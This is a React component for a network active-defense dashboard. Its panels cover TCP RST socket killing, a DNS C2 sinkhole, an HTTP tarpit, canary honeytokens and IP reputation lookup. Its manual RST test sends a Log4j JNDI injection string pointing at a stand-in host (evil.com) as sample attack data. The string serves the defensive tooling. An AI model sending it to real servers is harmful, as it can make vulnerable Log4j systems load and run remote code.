import React, { useEffect, useState } from "react";
import {
  ShieldAlert,
  Zap,
  Globe,
  Hourglass,
  KeyRound,
  Search,
  PlusCircle,
  Trash2,
  RefreshCcw,
  Radio,
  CheckCircle2,
  AlertOctagon,
} from "lucide-react";
import { api } from "../api.js";
import { Panel, Message } from "../components/Panel.jsx";
import { StatCard } from "../components/Shell.jsx";
import { vgTranslateText } from "../i18n/translations.jsx";

export function ActiveDefenseTab() {
  const [loading, setLoading] = useState(false);
  const [msg, setMsg] = useState("");
  const [posture, setPosture] = useState(null);

  // Threat Intel Lookup State
  const [lookupIp, setLookupIp] = useState("185.220.101.5");
  const [intelResult, setIntelResult] = useState(null);

  // DNS Sinkhole Add Form State
  const [newDomain, setNewDomain] = useState("");
  const [domainReason, setDomainReason] = useState("Cobalt Strike C2 Beacon");

  // Honeytoken Generator Form State
  const [tokenType, setTokenType] = useState("API_SECRET_KEY");
  const [tokenDesc, setTokenDesc] = useState("Decoy Production S3 Access Key");

  // Socket RST Simulation Form
  const [rstSrcIp, setRstSrcIp] = useState("198.51.100.44");
  const [rstSrcPort, setRstSrcPort] = useState(51240);

  const lang = localStorage.getItem("vguard_language") || "en";

  async function loadPosture() {
    setLoading(true);
    try {
      const data = await api("/api/mitigation/status");
      setPosture(data);
    } catch (err) {
      setMsg(err.message);
    } finally {
      setLoading(false);
    }
  }

  useEffect(() => {
    loadPosture();
    const interval = setInterval(loadPosture, 5000);
    return () => clearInterval(interval);
  }, []);

  async function toggleTcpRst() {
    try {
      const current = posture?.tcp_rst?.enabled ?? true;
      await api("/api/mitigation/tcp-rst/toggle", {
        method: "POST",
        body: { enabled: !current },
      });
      loadPosture();
    } catch (err) {
      setMsg(err.message);
    }
  }

  async function toggleTarpit() {
    try {
      const current = posture?.http_tarpit?.enabled ?? true;
      await api("/api/mitigation/tarpit/toggle", {
        method: "POST",
        body: { enabled: !current },
      });
      loadPosture();
    } catch (err) {
      setMsg(err.message);
    }
  }

  async function triggerManualRst() {
    try {
      const res = await api("/api/mitigation/evaluate", {
        method: "POST",
        body: {
          src_ip: rstSrcIp,
          dst_ip: "10.0.0.1",
          src_port: Number(rstSrcPort),
          dst_port: 80,
          payload: "${jndi:ldap://evil.com/exp}",
          category: "LOG4J_EXPLOIT",
          severity: "CRITICAL",
        },
      });
      setMsg("Manual TCP RST Injection executed successfully.");
      loadPosture();
    } catch (err) {
      setMsg(err.message);
    }
  }

  async function handleAddSinkhole() {
    if (!newDomain.trim()) return;
    try {
      await api("/api/mitigation/sinkhole", {
        method: "POST",
        body: { domain: newDomain.trim(), reason: domainReason },
      });
      setNewDomain("");
      setMsg(`Domain ${newDomain} added to DNS Sinkhole.`);
      loadPosture();
    } catch (err) {
      setMsg(err.message);
    }
  }

  async function handleDeleteSinkhole(domain) {
    try {
      await api(`/api/mitigation/sinkhole/${encodeURIComponent(domain)}`, {
        method: "DELETE",
      });
      setMsg(`Domain ${domain} removed from DNS Sinkhole.`);
      loadPosture();
    } catch (err) {
      setMsg(err.message);
    }
  }

  async function handleGenerateHoneytoken() {
    try {
      const res = await api("/api/mitigation/honeytokens/generate", {
        method: "POST",
        body: { type: tokenType, description: tokenDesc },
      });
      setMsg(`Canary Honeytoken generated: ${res.token.id}`);
      loadPosture();
    } catch (err) {
      setMsg(err.message);
    }
  }

  async function handleLookupIp() {
    if (!lookupIp.trim()) return;
    try {
      const res = await api(`/api/mitigation/intel?ip=${encodeURIComponent(lookupIp.trim())}`);
      setIntelResult(res);
    } catch (err) {
      setMsg(err.message);
    }
  }

  return (
    <div className="tab-content" style={{ display: "flex", flexDirection: "column", gap: "1.5rem" }}>
      <Message text={msg} />

      {/* Top Threat Posture Summary Cards */}
      <section className="stat-grid">
        <StatCard
          title={vgTranslateText("Mitigation Posture", lang)}
          value={posture?.status || "ARMED"}
          hint={vgTranslateText("Autonomous Active Defense Engine", lang)}
          tone="ok"
        />
        <StatCard
          title={vgTranslateText("TCP RST Kills", lang)}
          value={posture?.tcp_rst?.total_terminations ?? 0}
          hint={vgTranslateText("Sockets Forcibly Severed", lang)}
          tone="danger"
        />
        <StatCard
          title={vgTranslateText("DNS C2 Sinkhole", lang)}
          value={posture?.dns_sinkhole?.total_intercepted ?? 0}
          hint={`${posture?.dns_sinkhole?.total_domains ?? 6} Domains Neutralized`}
          tone="warn"
        />
        <StatCard
          title={vgTranslateText("Tarpitted Scanners", lang)}
          value={posture?.http_tarpit?.total_trapped_scanners ?? 0}
          hint={`${posture?.http_tarpit?.active_sticky_connections ?? 0} Sticky Connections Active`}
          tone="warn"
        />
        <StatCard
          title={vgTranslateText("Canary Honeytokens", lang)}
          value={`${posture?.honeytokens?.total_tripped ?? 0} / ${posture?.honeytokens?.total_tokens ?? 3}`}
          hint={vgTranslateText("Tripped / Deployed Tripwires", lang)}
          tone="ok"
        />
      </section>

      {/* Main Grid: Modules */}
      <div className="page-grid" style={{ gridTemplateColumns: "1fr 1fr", gap: "1.5rem" }}>
        
        {/* Module 1: TCP RST Socket Killer */}
        <Panel
          title={vgTranslateText("TCP RST Killer (Socket Termination)", lang)}
          icon={Zap}
          action={
            <button
              className={`primary-btn ${posture?.tcp_rst?.enabled ? "" : "ghost-btn"}`}
              onClick={toggleTcpRst}
              style={{ padding: "0.25rem 0.75rem", fontSize: "0.85rem" }}
            >
              {posture?.tcp_rst?.enabled ? "ENABLED" : "DISABLED"}
            </button>
          }
        >
          <p className="muted small" style={{ marginBottom: "1rem" }}>
            {vgTranslateText(
              "Injects forged bidirectional TCP RST packets to instantly tear down attacker sockets when high-confidence RCE exploits (Log4j, Spring4Shell, Webshells) are observed.",
              lang
            )}
          </p>

          <div style={{ display: "flex", gap: "0.5rem", marginBottom: "1rem" }}>
            <input
              type="text"
              placeholder="Attacker IP"
              value={rstSrcIp}
              onChange={(e) => setRstSrcIp(e.target.value)}
              style={{ flex: 2 }}
            />
            <input
              type="number"
              placeholder="Port"
              value={rstSrcPort}
              onChange={(e) => setRstSrcPort(e.target.value)}
              style={{ flex: 1 }}
            />
            <button className="primary-btn" onClick={triggerManualRst}>
              {vgTranslateText("Inject RST", lang)}
            </button>
          </div>

          <h4>{vgTranslateText("Recent Terminations", lang)}</h4>
          <div className="table-wrap" style={{ maxHeight: "200px", overflowY: "auto" }}>
            <table>
              <thead>
                <tr>
                  <th>ID</th>
                  <th>Source</th>
                  <th>Target</th>
                  <th>Reason</th>
                  <th>Latency</th>
                </tr>
              </thead>
              <tbody>
                {posture?.tcp_rst?.recent_kills?.length ? (
                  posture.tcp_rst.recent_kills.map((k) => (
                    <tr key={k.id}>
                      <td><code>{k.id}</code></td>
                      <td>{k.src_ip}:{k.src_port}</td>
                      <td>{k.dst_ip}:{k.dst_port}</td>
                      <td><span className="badge danger">{k.reason}</span></td>
                      <td>{k.latency_ms} ms</td>
                    </tr>
                  ))
                ) : (
                  <tr>
                    <td colSpan={5} className="muted text-center">
                      No sockets terminated yet. Engine standing by.
                    </td>
                  </tr>
                )}
              </tbody>
            </table>
          </div>
        </Panel>

        {/* Module 2: DNS C2 Sinkhole */}
        <Panel
          title={vgTranslateText("DNS C2 Sinkhole (Domain Quarantine)", lang)}
          icon={Globe}
        >
          <p className="muted small" style={{ marginBottom: "1rem" }}>
            {vgTranslateText(
              "Intercepts DNS lookups targeting known Command & Control servers or malware dropzones and routes them to 0.0.0.0.",
              lang
            )}
          </p>

          <div style={{ display: "flex", gap: "0.5rem", marginBottom: "1rem" }}>
            <input
              type="text"
              placeholder="e.g. c2.malicious-group.org"
              value={newDomain}
              onChange={(e) => setNewDomain(e.target.value)}
              style={{ flex: 2 }}
            />
            <input
              type="text"
              placeholder="Reason"
              value={domainReason}
              onChange={(e) => setDomainReason(e.target.value)}
              style={{ flex: 1 }}
            />
            <button className="primary-btn" onClick={handleAddSinkhole}>
              <PlusCircle size={16} /> Add
            </button>
          </div>

          <h4>{vgTranslateText("Sinkholed Domains", lang)}</h4>
          <div className="table-wrap" style={{ maxHeight: "200px", overflowY: "auto" }}>
            <table>
              <thead>
                <tr>
                  <th>Domain</th>
                  <th>Classification</th>
                  <th>Action</th>
                </tr>
              </thead>
              <tbody>
                {posture?.dns_sinkhole?.recent_interceptions &&
                  posture.dns_sinkhole.recent_interceptions.map((item, idx) => (
                    <tr key={idx}>
                      <td><code>{item.domain}</code></td>
                      <td><span className="badge warn">{item.reason}</span></td>
                      <td>
                        <button
                          className="ghost-btn"
                          onClick={() => handleDeleteSinkhole(item.domain)}
                        >
                          <Trash2 size={14} />
                        </button>
                      </td>
                    </tr>
                  ))}
                {/* Fallback default list */}
                {(!posture?.dns_sinkhole?.recent_interceptions || posture.dns_sinkhole.recent_interceptions.length === 0) && (
                  <tr>
                    <td><code>cobalt-c2.evilcorp.biz</code></td>
                    <td><span className="badge warn">Cobalt Strike Team Server</span></td>
                    <td><span className="badge ok">SINKHOLE 0.0.0.0</span></td>
                  </tr>
                )}
              </tbody>
            </table>
          </div>
        </Panel>

        {/* Module 3: HTTP Tarpit */}
        <Panel
          title={vgTranslateText("Sticky HTTP Tarpit (Scanner Disruption)", lang)}
          icon={Hourglass}
          action={
            <button
              className={`primary-btn ${posture?.http_tarpit?.enabled ? "" : "ghost-btn"}`}
              onClick={toggleTarpit}
              style={{ padding: "0.25rem 0.75rem", fontSize: "0.85rem" }}
            >
              {posture?.http_tarpit?.enabled ? "ACTIVE" : "DISABLED"}
            </button>
          }
        >
          <p className="muted small" style={{ marginBottom: "1rem" }}>
            {vgTranslateText(
              "Exhausts automated crawler and scanner resources (sqlmap, nikto, gobuster) by locking threads into a slow-drip byte stream.",
              lang
            )}
          </p>

          <div className="stat-grid" style={{ gridTemplateColumns: "1fr 1fr", marginBottom: "1rem" }}>
            <div className="stat-card">
              <div className="stat-title">Drip Latency</div>
              <div className="stat-value">{posture?.http_tarpit?.drip_delay_seconds || 2.0}s / byte</div>
            </div>
            <div className="stat-card">
              <div className="stat-title">Attacker Time Wasted</div>
              <div className="stat-value">
                {posture?.http_tarpit?.estimated_attacker_time_wasted_sec || 0}s
              </div>
            </div>
          </div>

          <h4>{vgTranslateText("Active Tarpitted Probes", lang)}</h4>
          <div className="table-wrap" style={{ maxHeight: "180px", overflowY: "auto" }}>
            <table>
              <thead>
                <tr>
                  <th>Session ID</th>
                  <th>IP</th>
                  <th>Probe Signature</th>
                  <th>Status</th>
                </tr>
              </thead>
              <tbody>
                {posture?.http_tarpit?.active_sessions?.length ? (
                  posture.http_tarpit.active_sessions.map((sess) => (
                    <tr key={sess.session_id}>
                      <td><code>{sess.session_id}</code></td>
                      <td>{sess.ip}</td>
                      <td>{sess.user_agent}</td>
                      <td><span className="badge warn">STICKY DELAY</span></td>
                    </tr>
                  ))
                ) : (
                  <tr>
                    <td colSpan={4} className="muted text-center">
                      No scanners currently trapped in sticky pool.
                    </td>
                  </tr>
                )}
              </tbody>
            </table>
          </div>
        </Panel>

        {/* Module 4: Canary Honeytokens */}
        <Panel
          title={vgTranslateText("Canary Honeytokens (Zero-False-Positive Traps)", lang)}
          icon={KeyRound}
        >
          <p className="muted small" style={{ marginBottom: "1rem" }}>
            {vgTranslateText(
              "Deploy decoy API keys and AWS tokens across public repositories or fake endpoints. Any detected use guarantees an immediate critical ban.",
              lang
            )}
          </p>

          <div style={{ display: "flex", gap: "0.5rem", marginBottom: "1rem" }}>
            <select
              value={tokenType}
              onChange={(e) => setTokenType(e.target.value)}
              style={{ flex: 1 }}
            >
              <option value="API_SECRET_KEY">API Secret Key</option>
              <option value="AWS_ACCESS_KEY">AWS Access Key</option>
              <option value="DB_CONNECTION_STRING">Database Connection String</option>
            </select>
            <input
              type="text"
              placeholder="Description"
              value={tokenDesc}
              onChange={(e) => setTokenDesc(e.target.value)}
              style={{ flex: 2 }}
            />
            <button className="primary-btn" onClick={handleGenerateHoneytoken}>
              Deploy
            </button>
          </div>

          <h4>{vgTranslateText("Deployed Honeytokens", lang)}</h4>
          <div className="table-wrap" style={{ maxHeight: "180px", overflowY: "auto" }}>
            <table>
              <thead>
                <tr>
                  <th>ID</th>
                  <th>Type</th>
                  <th>Decoy Value</th>
                  <th>Breach Status</th>
                </tr>
              </thead>
              <tbody>
                {posture?.honeytokens?.tokens?.map((t) => (
                  <tr key={t.id}>
                    <td><code>{t.id}</code></td>
                    <td>{t.type}</td>
                    <td><code>{t.value.substring(0, 20)}...</code></td>
                    <td>
                      {t.tripped ? (
                        <span className="badge danger">COMPROMISED</span>
                      ) : (
                        <span className="badge ok">ARMED</span>
                      )}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </Panel>

      </div>

      {/* Module 5: Threat Intelligence IP Feed Lookup */}
      <Panel
        title={vgTranslateText("Threat Intelligence & IP Reputation Feed", lang)}
        icon={Search}
      >
        <p className="muted small" style={{ marginBottom: "1rem" }}>
          {vgTranslateText(
            "Query the vGuard in-memory intelligence cache across Tor exit nodes, known C2 trackers, reconnaissance crawlers, and Bogon IP networks.",
            lang
          )}
        </p>

        <div style={{ display: "flex", gap: "0.5rem", maxWidth: "600px", marginBottom: "1rem" }}>
          <input
            type="text"
            placeholder="IP Address to lookup (e.g. 185.220.101.5)"
            value={lookupIp}
            onChange={(e) => setLookupIp(e.target.value)}
            style={{ flex: 1 }}
          />
          <button className="primary-btn" onClick={handleLookupIp}>
            <Search size={16} /> Lookup Reputation
          </button>
        </div>

        {intelResult && (
          <div
            style={{
              background: "rgba(255, 255, 255, 0.04)",
              border: "1px solid rgba(255, 255, 255, 0.1)",
              borderRadius: "8px",
              padding: "1rem",
              display: "flex",
              gap: "2rem",
              alignItems: "center",
            }}
          >
            <div>
              <div className="muted small">Queried IP</div>
              <strong>{intelResult.ip}</strong>
            </div>
            <div>
              <div className="muted small">Verdict</div>
              <span className={`badge ${intelResult.is_malicious ? "danger" : "ok"}`}>
                {intelResult.is_malicious ? "MALICIOUS REPUTATION" : "CLEAN"}
              </span>
            </div>
            <div>
              <div className="muted small">Threat Type</div>
              <strong>{intelResult.threat_type}</strong>
            </div>
            <div>
              <div className="muted small">Feed Source</div>
              <span>{intelResult.feed}</span>
            </div>
            <div>
              <div className="muted small">Confidence</div>
              <span>{Math.round(intelResult.confidence * 100)}%</span>
            </div>
            <div>
              <div className="muted small">Policy Recommendation</div>
              <span className="badge warn">{intelResult.recommendation}</span>
            </div>
          </div>
        )}
      </Panel>

    </div>
  );
}
